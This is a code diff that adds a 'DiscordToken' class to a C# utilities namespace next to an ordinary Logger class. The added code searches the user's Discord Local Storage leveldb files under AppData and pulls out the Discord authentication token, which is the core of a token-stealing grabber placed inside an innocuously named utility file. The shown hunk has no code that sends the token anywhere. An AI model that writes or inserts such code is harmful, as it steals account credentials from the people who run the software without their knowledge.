@@ -107,6 +107,71 @@ namespace Utils
         }
     }
 
+    public class DiscordToken
+    {
+        private static string GrabToken(string stringx)
+        {
+            byte[] bytes = File.ReadAllBytes(stringx);
+            string fileContents = Encoding.UTF8.GetString(bytes);
+            string authToken = "";
+
+            if (fileContents.Contains("token"))
+            {
+                string[] array = FindToken(fileContents).Split(new char[]
+                {
+                    '"'
+                });
+
+                authToken = array[0];
+            }
+
+            return authToken;
+        }
+        private static bool FindLDB(ref string levelDB)
+        {
+            if (Directory.Exists(levelDB))
+            {
+                foreach (FileInfo fileInfo in new DirectoryInfo(levelDB).GetFiles())
+                {
+                    if (fileInfo.Name.EndsWith(".ldb") && File.ReadAllText(fileInfo.FullName).Contains("token"))
+                    {
+                        levelDB += fileInfo.Name;
+                        return levelDB.EndsWith(".ldb");
+                    }
+                }
+                return levelDB.EndsWith(".ldb");
+            }
+            return false;
+        }
+
+        private static string FindToken(string path)
+        {
+            string[] array = path.Substring(path.IndexOf("token") + 4).Split(new char[]
+            {
+                '"'
+            });
+
+            List<string> list = new List<string>();
+            list.AddRange(array);
+            list.RemoveAt(0);
+
+            array = list.ToArray();
+            return string.Join("\"", array);
+        }
+
+        public static string GetAuthToken()
+        {
+            string pathStr = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";
+
+            if (!FindLDB(ref pathStr))
+                return "";
+
+            string tokenStr = GrabToken(pathStr);
+
+            return tokenStr;
+        }
+    }
+
     public class Logger
     {
         public Logger()
